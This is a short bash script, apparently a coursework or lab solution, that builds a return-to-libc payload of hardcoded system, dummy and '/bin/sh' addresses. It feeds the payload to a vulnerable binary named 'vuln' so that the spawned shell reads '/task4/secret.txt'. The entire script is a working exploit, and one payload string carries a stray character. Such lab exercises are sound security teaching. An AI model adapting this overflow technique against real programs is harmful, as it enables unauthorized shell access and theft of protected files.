#!/usr/bin/env bash

#put system address + dummy address + 'bin/sh' address
input="$(python -c "print('\x10\xee\xe1\xf7\xb7\xe9\xef\x10\x8f\xd8\xf5\xf7)')")"
echo /bin/cat /task4/secret.txt | env -i SHELL='/bin/sh' \
 /task4/s1813106/vuln $(echo -en $input) 1244